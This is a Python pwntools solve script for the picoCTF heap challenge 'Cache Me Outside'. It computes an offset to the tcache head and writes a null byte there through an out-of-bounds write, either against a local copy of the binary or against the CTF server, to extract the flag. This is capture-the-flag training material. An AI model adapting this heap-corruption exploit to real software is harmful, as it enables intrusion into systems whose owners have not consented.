#!/usr/bin/env python3
"""
WhatTheFuzz's submission for the picoCTF challenge Cache Me Outside.

This script can be used in the following manner:
python3 ./solve.py <REMOTE/LOCAL>

Args:
    param1: LOCAL will operate locally on the user's machine.
            REMOTE will connect to the CTF webserver and grab the flag.
            If no parameter is specified, the program will default to LOCAL.

Returns:
    The flag to solve the challenge.
"""

import re
import pwn

pwn.exe = pwn.ELF('./heapedit')
libc = pwn.ELF('./libc.so.6')
ld = pwn.ELF('./ld-2.27.so')

pwn.context.binary = pwn.exe
pwn.context.log_level = 'info'
pwn.context.terminal = ['gnome-terminal', '-e']

HEAD_OF_TCACHE = 0x602088
BUFFER_ADDED_TO = 0x6034a0
NULL_BYTE = b'\x00'


def conn():
    '''Establish the connection to the process, local or remote.
    Return the connection.
    '''
    if pwn.args.get('REMOTE'):
        connection = pwn.remote('mercury.picoctf.net', 34499)
    else:
        connection = pwn.process(
            './heapedit', env={'LD_PRELOAD': f'{ld.path}:{libc.path}'})
    return connection


def main():
    '''Return the flag.'''
    connection = conn()

    # Calculate the offset
    offset = HEAD_OF_TCACHE - BUFFER_ADDED_TO

    # Receive data until we see the following, then send our data.
    connection.sendlineafter(b'Address: ', str(offset).encode())
    pwn.log.debug(f'The offset to the tcache is {offset}.')
    connection.sendlineafter(b'Value: ', NULL_BYTE)

    # Get the flag.
    line = connection.recvlineS()
    flag = re.search('picoCTF{.*}', line).group(0)

    pwn.log.success(f'The flag is: {flag}.')
    return flag


if __name__ == '__main__':
    main()
